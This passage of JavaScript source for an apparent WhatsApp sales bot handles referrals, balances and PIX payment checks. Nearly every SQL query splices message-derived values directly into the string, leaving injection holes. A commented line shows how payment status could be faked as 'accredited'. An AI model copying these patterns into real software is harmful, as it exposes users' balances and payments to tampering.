        if (Mensagem_Texto.indexOf("BONUS_COD#") > -1) {
            //INDICADOR#

            FUNCAO_ASSOCIADOS_PAGO = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'FUNCAO_ASSOCIADOS_PAGO'`).get()["VALOR"]
            if (FUNCAO_ASSOCIADOS_PAGO === "1") {
                ATIVAR_ASSOCIADOS = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ATIVAR_ASSOCIADOS'`).get()["VALOR"]
                if (ATIVAR_ASSOCIADOS === "1") {

                    NUMERO_INDICADOR = Mensagem_Texto.replace(/[^0-9]/igm, '');
                    console.log(`${NUMERO_INDICADOR}@c.us`, Mensagem_From)
                    if (`${NUMERO_INDICADOR}@c.us` === Mensagem_From) {
                        Texto = `*VOCÊ NÃO PODE INDICAR A SI MESMO.*`
                        await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                        Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                    }

                    Ja_tem_Indicador = await DataBase_Better.prepare(`SELECT NUMERO_INDICADOR FROM CONTATOS WHERE ID_CONTATO = '${Mensagem_From}'`).get()
                    if (Ja_tem_Indicador["NUMERO_INDICADOR"] != "0") {
                        Texto = `*VOCÊ JÁ POSSUI INDICADOR!*`
                        await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                        Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                    }

                    Numero_Banco = await DataBase_Better.prepare(`SELECT ID_CONTATO FROM CONTATOS WHERE ID_CONTATO = '${NUMERO_INDICADOR}@c.us'`).get()
                    if (Numero_Banco === undefined) {
                        Texto = `*INDICADOR NÃO ENCONTRADO!*`
                        await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                        Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                    }

                    await DataBase_Better.prepare(`UPDATE CONTATOS SET NUMERO_INDICADOR = '${NUMERO_INDICADOR}@c.us' WHERE ID_CONTATO = '${Mensagem_From}'`).run()

                    SALDO_USUARIO = await DataBase_Better.prepare(`SELECT SALDO FROM CONTATOS WHERE ID_CONTATO = '${Mensagem_From}'`).get()["SALDO"]
                    SALDO_USUARIO = parseFloat(SALDO_USUARIO).toFixed(2);

                    BONUS_VIROU_INDICADO = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'BONUS_VIROU_INDICADO'`).get()["VALOR"]
                    BONUS_VIROU_INDICADO = parseFloat(BONUS_VIROU_INDICADO).toFixed(2)
                    NOVO_SALDO = parseFloat(SALDO_USUARIO) + parseFloat(BONUS_VIROU_INDICADO)
                    NOVO_SALDO = parseFloat(NOVO_SALDO).toFixed(2)
                    await DataBase_Better.prepare(`UPDATE CONTATOS SET SALDO = '${NOVO_SALDO}' WHERE ID_CONTATO = '${Mensagem_From}'`).run()

                    Texto_Usuario = `*VOCÊ DEFINIU SEU INDICADOR!*

*INDICADOR:* wa.me/${NUMERO_INDICADOR}

*BÔNUS DE R$:${BONUS_VIROU_INDICADO} ADICIONADO EM SEU SALDO.*
`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto_Usuario}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

                    Texto_Indicador = `👤 *NOVO INDICADO!* 👤

💵 *INDICADO:* wa.me/${Numero}`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${NUMERO_INDICADOR}@c.us', 
'sendText',
'${Texto_Indicador}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()


                    NOT_NOVO_INDICADO = await DataBase_Better.prepare(`SELECT VALOR FROM NOTIFICACOES_GRUPOS WHERE PARAMETRO = 'NOT_NOVO_INDICADO'`).get()["VALOR"]
                    if (NOT_NOVO_INDICADO === "1") {

                        Texto_Grupo = `👤 *USUÁRIO ACABOU DE INDICAR ALGUÉM* 👤

💵 *INDICADO:* wa.me/${Numero}
*O INDICADO ACABA DE GANHAR: R$:${BONUS_VIROU_INDICADO}* 

👤 *INDICADOR:* wa.me/${NUMERO_INDICADOR}
*AGORA O INDICADOR GANHA UM PERCENTUAL DE LUCRO SOBRE TODAS AS COMPRAS QUE O INDICADO FIZER!*

*VENHA SER UM ASSOCIADO*

*${Nome_Bot}*
wa.me/${NUMERO_PURO_BOT}`

                        for await (Grupo of ID_GRUPOS) {
                            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Grupo["ID_GRUPO"]}, 
'sendText',
'${Texto_Grupo}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'${FOTO_Indicou_GP}',
'${Date.now()}')`).run()
                        }
                    }

                    Texto = `*USUÁRIO INDICOU OUTRO*

👤 *INDICADOR:* wa.me/${NUMERO_INDICADOR}
💵 *INDICADO:* wa.me/${Numero}`
                    for await (adm of Adms) {
                        await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    }
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳


        //console.log('\x1b[33m%s\x1b[0m', LinhaAtual())




        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if ((Mensagem_Tipo).toString() === "list_response") {
            try {
                ID_Botao_Banco = await DataBase_Better.prepare(`SELECT ID_BOTAO FROM CONTATOS WHERE ID_CONTATO = '${Mensagem_From}'`).get()["ID_BOTAO"]
                ULTIMO_ID = ID_Botao_Banco.split("|")
                ULTIMO_ID = ULTIMO_ID[0]
                //console.log('\x1b[33m%s\x1b[0m', LinhaAtual())
                if (ULTIMO_ID != "liberar_esta_interacao_se_for_antiga") {
                    ATUAL_ID = Mensagem_ID_Lista_Array_Partes[0]
                    //console.log('\x1b[33m%s\x1b[0m', LinhaAtual())
                    if (ULTIMO_ID != ATUAL_ID) {
                        //console.log('\x1b[33m%s\x1b[0m', LinhaAtual())
                        console.log(`ULTIMO_ID:${ULTIMO_ID} | ATUAL_ID:${ATUAL_ID}`);
                        console.log("Botão desconhecido...");
                        //console.log('\x1b[33m%s\x1b[0m', LinhaAtual())
                        Texto = `⚠️ *VOCÊ ESTÁ INTERAGINDO COM OPÇÕES DE LISTAS ANTIGAS... ISSO NÃO É PERMITIDO! INTERAJA APENAS COM AS OPÇÕES E MENUS ATUAIS!*`
                        await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}', 
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                        Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                    }
                    //console.log('\x1b[33m%s\x1b[0m', LinhaAtual())
                } else {
                    //console.log('\x1b[33m%s\x1b[0m', LinhaAtual())
                    console.log("Ultimo ID de menu foi liberar_esta_interacao_se_for_antiga")
                }

            } catch (error) { console.log('\x1b[33m%s\x1b[0m', error) }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳







        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        SALDO_USUARIO = await DataBase_Better.prepare(`SELECT SALDO FROM CONTATOS WHERE ID_CONTATO = '${Mensagem_From}'`).get()["SALDO"]
        SALDO_USUARIO = parseFloat(SALDO_USUARIO).toFixed(2);

        LIMITE_SALDO = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'LIMITE_SALDO'`).get()["VALOR"]
        if (parseInt(SALDO_USUARIO) > LIMITE_SALDO) {
            if (Adms.includes(Numero)) {

            } else {

                Texto = `⚠️ Você atingiu o máximo de saldo que um usário pode ter! seu saldo: R$:${SALDO_USUARIO} o limite que o dono definiu: R$:${LIMITE_SALDO} *Contate o dono do Bot!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}', 
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }

        if (SALDO_USUARIO === "NaN") {
            if (Adms.includes(Numero)) {
                Texto = `⚠️ Algo errado com seu saldo (R$:${SALDO_USUARIO}) *VOCÊ É ADM, ENTÃO NÃO IREI TE BARRAR.*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}', 
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

            } else {
                Texto = `⚠️ Algo errado com seu saldo (R$:${SALDO_USUARIO}) *Contate o dono do Bot!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}', 
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        if (new RegExp("[^0-9\.]").test(SALDO_USUARIO)) {
            if (Adms.includes(Numero)) {
                Texto = `⚠️ Algo errado com seu saldo (R$:${SALDO_USUARIO}) *VOCÊ É ADM, ENTÃO NÃO IREI TE BARRAR.*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}', 
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

            } else {
                Texto = `⚠️ Algo errado com seu saldo (R$:${SALDO_USUARIO}) *Contate o dono do Bot!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}', 
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        if(parseFloat(SALDO_USUARIO) < 0){
            SALDO_USUARIO = 0
            await DataBase_Better.prepare(`UPDATE CONTATOS SET SALDO = '${SALDO_USUARIO}' WHERE ID_CONTATO = '${Mensagem_From}'`).run()
            console.log("SALDO AJUSTADO POIS ESTAVA NEGATIVO: 0")
        }else{
            console.log("Saldo: " + SALDO_USUARIO)
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳


        //console.log('\x1b[33m%s\x1b[0m', LinhaAtual())


        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if ((Mensagem_Tipo).toString() === "list_response" || Mensagem_Texto.toString() === "/paguei" || Mensagem_Texto.toString() === "/desistir") {//PIX PAGOU OU DSISTIU
            //console.log('\x1b[33m%s\x1b[0m', LinhaAtual())
            if (Mensagem_Texto.indexOf("✅ PAGUEI O PIX") > -1 || Mensagem_Texto.indexOf("❌ DESISTIR") > -1 || Mensagem_Texto.toString() === "/paguei" || Mensagem_Texto.toString() === "/desistir") {
                //console.log('\x1b[33m%s\x1b[0m', LinhaAtual())
                PIX_PENDENTE = await DataBase_Better.prepare(`SELECT PROCESSADO FROM PIX_COPIA_COLA WHERE NUMERO_QUEM_GEROU = '${Mensagem_From}' AND PROCESSADO = '0'`).get()
                if (PIX_PENDENTE === undefined) {
                    Texto = "Não há PIXs pendentes a serem processados..."
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}', 
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }

                Numero_from_Creditando = Mensagem_From
                try {
                    ID_PAGAMENTO = await DataBase_Better.prepare(`SELECT ID_PAGAMENTO FROM PIX_COPIA_COLA WHERE NUMERO_QUEM_GEROU = '${Numero_from_Creditando}' AND PROCESSADO = '0'`).get()["ID_PAGAMENTO"]
                } catch (error) {
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
                DATA_INSERIDO_MS = await DataBase_Better.prepare(`SELECT DATA_INSERIDO_MS FROM PIX_COPIA_COLA WHERE NUMERO_QUEM_GEROU = '${Numero_from_Creditando}'`).get()["DATA_INSERIDO_MS"]

                TOKEN_MP = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'TOKEN_MP'`).get()["VALOR"]

                var options = {
                    mode: 'text', args: [ID_PAGAMENTO, TOKEN_MP]
                };
                PythonShell.run('ConsultarPagamentoMP.py', options, async function (error, Resultado) {
                    if (error) {
                        //console.log(error)
                        return
                    };
                    Div = (Resultado).toString().split(",")
                    Status = Div[0]//OFICIAL
                    //Status = "accredited"//MANIPULADO
                    VALOR_CAIU_CREDITAR = Div[1]
                    VALOR_CAIU_CREDITAR = parseFloat(VALOR_CAIU_CREDITAR).toFixed(2);
                    //console.log(Status)
                    //console.log(VALOR_CAIU_CREDITAR)/re

                    console.log(Status)
                    Texto = `*STATUS DO PIX GERADO: ${Status}*`
                    Texto = Texto.replace(/\'/igm, "")
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}', 
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

                    if ((Status).toString().indexOf("accredited") > -1) {
                        Item_Fila_Sendo_Processado_MS = Date.now()

                        NUMERO_INDICADOR = await DataBase_Better.prepare(`SELECT NUMERO_INDICADOR FROM CONTATOS WHERE ID_CONTATO = '${Numero_from_Creditando}'`).get()["NUMERO_INDICADOR"]
                        if (NUMERO_INDICADOR != "0") {

                            COMISSAO_INDICACAO_RECARGA = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'COMISSAO_INDICACAO_RECARGA'`).get()["VALOR"]
                            COMISSAO_INDICACAO_RECARGA = parseFloat(COMISSAO_INDICACAO_RECARGA).toFixed(2)
                            if (parseFloat(COMISSAO_INDICACAO_RECARGA) != 0.00 && parseFloat(COMISSAO_INDICACAO_RECARGA) != 0) {

                                SALDO_USUARIO_INDICADOR = await DataBase_Better.prepare(`SELECT SALDO FROM CONTATOS WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).get()["SALDO"]
                                SALDO_USUARIO_INDICADOR = parseFloat(SALDO_USUARIO_INDICADOR).toFixed(2)

                                VALOR_COMISSAO_INDICACAO = (VALOR_CAIU_CREDITAR * parseFloat(`0.${COMISSAO_INDICACAO_RECARGA}`));
                                VALOR_COMISSAO_INDICACAO = parseFloat(VALOR_COMISSAO_INDICACAO).toFixed(2)

                                NOVO_SALDO_INDICADOR = parseFloat(SALDO_USUARIO_INDICADOR) + parseFloat(VALOR_COMISSAO_INDICACAO)
                                NOVO_SALDO_INDICADOR = parseFloat(NOVO_SALDO_INDICADOR).toFixed(2)

                                await DataBase_Better.prepare(`UPDATE CONTATOS SET SALDO = '${NOVO_SALDO_INDICADOR}' WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).run()
                                Texto = `*VOCÊ GANHOU COMISSÃO SOBRE RECARGA DO INDICADO!*

*USUÁRIO INDICADO:* wa.me/${Numero}

*VALOR ADICIONADO PELO USUÁRIO:* R$:${VALOR_CAIU_CREDITAR}

*SUA COMISSÃO:* R$: ${VALOR_COMISSAO_INDICACAO}`
                                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${NUMERO_INDICADOR}', 
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                            }
                        }

                        SALDO_USUARIO = await DataBase_Better.prepare(`SELECT SALDO FROM CONTATOS WHERE ID_CONTATO = '${Numero_from_Creditando}'`).get()["SALDO"]
                        SALDO_USUARIO = parseFloat(SALDO_USUARIO).toFixed(2)

                        BONUS_RECARGA_PERCENTUAL = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'BONUS_RECARGA_PERCENTUAL'`).get()["VALOR"]

                        BONUS_RECARGA_PERCENTUAL_ACIMA_VALOR = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'BONUS_RECARGA_PERCENTUAL_ACIMA_VALOR'`).get()["VALOR"]
                        BONUS_RECARGA_PERCENTUAL_ACIMA_VALOR = parseFloat(BONUS_RECARGA_PERCENTUAL_ACIMA_VALOR).toFixed(2)
                        if (parseFloat(VALOR_CAIU_CREDITAR) < parseFloat(BONUS_RECARGA_PERCENTUAL_ACIMA_VALOR)) {
                            BONUS_RECARGA_PERCENTUAL = "0"//Retira o Bônus de recarga
                        }

                        if (BONUS_RECARGA_PERCENTUAL != "0") {
                            //console.log(VALOR_CAIU_CREDITAR)
                            //console.log(`0.${BONUS_RECARGA_PERCENTUAL}`)
                            VALOR_BONUS_RECARGA = ((parseFloat(BONUS_RECARGA_PERCENTUAL) * parseFloat(VALOR_CAIU_CREDITAR)) / 100);
                            console.log(`Processando PIX = Contato: ${Numero_from_Creditando} Valor: ${VALOR_CAIU_CREDITAR} Bonus: ${VALOR_BONUS_RECARGA}`)
                            VALOR_BONUS_RECARGA = parseFloat(VALOR_BONUS_RECARGA).toFixed(2)

                            SOMA_PIX_E_BONUS = parseFloat(VALOR_CAIU_CREDITAR) + parseFloat(VALOR_BONUS_RECARGA)
                            SOMA_PIX_E_BONUS = parseFloat(SOMA_PIX_E_BONUS).toFixed(2)
